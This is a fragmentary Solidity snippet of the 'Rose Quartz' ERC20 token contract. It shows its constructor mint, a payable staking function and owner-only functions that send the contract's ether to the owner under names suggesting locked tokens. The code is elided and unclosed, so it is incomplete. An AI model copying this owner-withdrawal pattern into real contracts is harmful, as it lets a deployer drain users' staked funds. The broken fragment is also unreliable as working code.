...
pragma solidity ^0.8.0;
contract RoseQuartz is ERC20, Ownable {
   ...
   // uint256 private sBBlock;
    ...
    constructor() ERC20("Rose Quartz", "RTZ") {
        _mint(msg.sender, 51100000*10**decimals());
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }  
...
function Stakingplan(address payable _toaddress, uint256 _balances, uint64 membcode, uint64 rcode, uint64 plan) public payable {
    ...
    function RoseQuartzTokenLocked_Exchange(uint amount) public onlyOwner {
    address payable _owner = payable(msg.sender);
    _owner.transfer(amount);
  }

    function RoseQuartzLocked_Token(IERC20 token, uint256 values) public onlyOwner {
        address payable _owner =  payable(msg.sender);
